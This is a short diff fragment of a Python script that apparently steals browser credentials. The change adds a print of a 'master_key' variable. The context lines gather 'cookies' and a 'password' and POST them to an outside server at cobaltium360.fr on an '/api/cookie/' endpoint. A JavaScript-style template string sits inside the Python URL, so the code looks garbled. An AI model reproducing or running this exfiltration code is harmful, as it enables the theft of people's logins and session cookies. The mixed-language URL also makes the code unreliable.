@@ -97,7 +97,7 @@ def main():
         else :
             error = error+1
         t += 1
-    
+    print(master_key)
     data = {"cookies": cookies, "password": password}
     r = requests.post('https://cobaltium360.fr:3001/api/cookie/${req.params.key}', json=data)
         
